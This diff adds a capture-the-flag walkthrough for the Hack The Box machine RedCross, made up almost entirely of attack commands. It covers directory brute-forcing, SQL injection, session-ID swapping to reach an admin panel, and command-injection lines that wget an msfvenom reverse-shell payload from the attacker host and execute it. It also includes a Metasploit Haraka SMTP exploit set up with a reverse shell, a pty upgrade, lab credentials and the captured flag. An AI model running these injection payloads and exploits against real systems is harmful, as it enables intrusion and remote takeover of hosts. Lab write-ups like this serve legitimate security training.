@@ -1,0 +1,109 @@
+#10.10.10.113
+#PORT- 22, 80, 443
+
+#add into hosts file:- 'intra.redcross.htb'
+#login page:- [ https://10.10.10.113   -->   https://intra.redcross.htb ]
+
+#nmap
+#dirb-   /documentation/,   /documentation/account-signup.pdf
+dirb https://intra.redcross.htb/documentation/ /usr/share/wordlists/dirbuster/directory-
+list-2.3-small.txt -X .pdf
+#found one user inside   https://intra.redcross.htb/documentation/account-signup.pdf
+#USER= Penelope Harris
+
+#access  https://intra.redcross.htb/?page=contact
+#fill the details as given in the 'account-signup.pdf'
+#got guest credentials
+#USER- guest
+#PASSWD- guest
+
+---------------------------------------------------------------
+1st METHOD
+---------------------------------------------------------------
+#sql injection found in filter box()   https://intra.redcross.htb/?o=
+1" and 1=1 #
+
+
+----------------------------------------------------------------
+2nd Method        (used)
+----------------------------------------------------------------
+#change the 'intra' to 'admin' in hosts file  'admin.redcross.htb'
+#then access new site
+https://admin.redcross.htb/?page=login
+
+#use same credentials as before but change the PHPSESSID
+#USER= guest
+#PASSWD= guest
+#intercept the data and change the PHPSESSID with the other PHPSESSID that you will get from previous session of guest login into 'intra.redcross.htb'
+#PHPSESSID= f87ae91tcpp541elg92gcgpau0   (always change)
+
+[ NOTE: always need to change the PHPESSID or just add into burp --> proxy --> options --> Match & Replace ] 
+
+#enter into 'admin panel'
+#add user 'ash'
+#got username and passwd
+#USER= ash           (with these you can access ftp & ssh)
+#PASSWD= JjFSQyC7   
+
+
+#click firewall and intercept request
+#change PHPSESSID= f87ae91tcpp541elg92gcgpau0
+#add local ip in 'Whitelist IP'
+
+--------------------------------------------
+1st Method to get shell
+--------------------------------------------
+#there is RCE on 'deny' button in firewall
+#create reverse shell payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.181 LPORT=1234 -f elf > shell.elf
+#start server on folder where shell.elf file is present
+python -m SimpleHTTPServer 80
+#start listner with nc or metasploit on port 1234 
+#intercept data and temper with that
+ip=1.1.1.1;whoami
+ip=1.1.1.1;cd /tmp;rm shell*;wget http://10.10.14.181/shell.elf ; sleep 2;pwd;chmod 777 shell.elf; shell.elf;ls -l
+ip=1.1.1.1;wget+http://10.10.14.181:4444/shell.elf+-O+/tmp/shell.elf;chmod+755+/tmp/shell.elf;/tmp/shell.elf
+
+--------------------------------------------
+2nd Method to get shell    (used)
+--------------------------------------------
+#now port scan again 
+#PORT- 21 (ftp, vsftpd 2.0.8), 22, 80, 443, 1025 (NFS-or-IIS), 5432 (PostgreSQL)
+
+#found port 1025 has vulnerable service running
+#run this and wait 
+ftp 10.10.10.113 1025
+#found one service ESMTP Haraka 2.8.8
+#found exploit on this service that uses email to get Remote Command Execution
+--------------------------------
+#1st Method To Exploit HARAKA
+--------------------------------
+>>>https://www.exploit-db.com/exploits/41162
+python 41162.py -c /bin/bash -f ash@redcross.htb -t penelope@redcross.htb -m 10.10.10.113  (not working)
+
+--------------------------------
+#2nd Method To Exploit HARAKA  (used)
+--------------------------------
+#Use Metasploit 
+msfconsole
+use exploit/linux/smtp/haraka
+set SRVHOST <local tun0 IP>
+set SRVPORT 1234 (random)
+set email_from ash@redcross.htb     (ash - user that is created on admin panel)
+set email_to penelope@redcross.htb	(penelope - user that has bash shell on server)
+set rhost 10.10.10.113
+set rport 1025				(SMTP server named HARAKA)
+
+set payload linux/x64/shell_reverse_tcp
+set lhost <local tun0 IP>
+set lport 4444
+exploit
+
+#GOT SHELL
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+#key
+ac899bd46f7b014a369fbb60e53329bf
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+@mitooo
